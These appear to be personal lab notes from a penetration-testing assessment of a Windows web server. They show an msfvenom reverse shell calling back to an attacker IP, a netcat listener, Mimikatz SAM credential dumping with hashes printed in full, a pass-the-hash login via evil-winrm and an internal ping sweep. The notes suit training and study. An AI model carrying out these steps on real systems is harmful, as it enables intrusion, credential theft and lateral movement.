Visit webshell provided in Description of assessment

#### Upgrading the shell

Generate a reverse shell exe with [[msfvenom]]
```bash-session
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.36 LPORT=1234 -f exe > shell-x64.exe
```
This shell is uploaded throught the webshell interface along with a [[Mimikatz]].exe binary.

a listener is started on the attack host

```bash-session
nc -lvnp 1234
```

the reverse shell exe is then executed with the following  command throught the web shell

```powershell-session
& “C:\shell-x64.exe”
```
Since we land on the system as the system user we can execute hte mimikatz binary and retrieve any credss same in memory

```
mimikatz # lsadump::sam
Domain : WEB-WIN01
SysKey : 908b8788f43a4425cb000861860970e3
Local SID : S-1-5-21-279593051-708607744-3403857608

SAMKey : 6769002d0925ddf06b5dbf8c0cb36218

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: bdaffbfe64f1fc646a3353be1c2c3c99

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 67dabe73f9a128df16e3b06ff4dac8d3

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-MSALO6CQSURAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 93825828ca405d1c5b433c870b25513745369e6dce832532a1525da12f0a2523
      aes128_hmac       (4096) : 78c109e5b2100e3a593b53a2998c10c7
      des_cbc_md5       (4096) : efb0d662b66dfe37
    OldCredentials
      aes256_hmac       (4096) : 23cbc0dad348bebcbdbb4c82e9b23af299e8b56de358bafe24f2235f34497e4a
      aes128_hmac       (4096) : e35eb565af30c8ed79df5d8875508df6
      des_cbc_md5       (4096) : 4904021983252cd5
    OlderCredentials
      aes256_hmac       (4096) : 57f1c79e0c75aa5308b9c8afcce610622a378fcd608ce49aaeabda5e92e578a5
      aes128_hmac       (4096) : e86a018820c2bf69562a282cdea6d2c0
      des_cbc_md5       (4096) : 490432b320157c92

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-MSALO6CQSURAdministrator
    Credentials
      des_cbc_md5       : efb0d662b66dfe37
    OldCredentials
      des_cbc_md5       : 4904021983252cd5


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
```

Now that we have the NTLM hash for the administrator account we can use a pass the hash attack with [[evil-winrm]] 

```bash-session
evil-winrm -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99 -i 10.129.202.242
```

ipconfig is used to identify subnets our host machine has access to.

```pwoershell-session
1..255 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
```

and several hosts are identified

```powershell-session
172.16.6.3: True
172.16.6.50: True
172.16.6.100: True
```

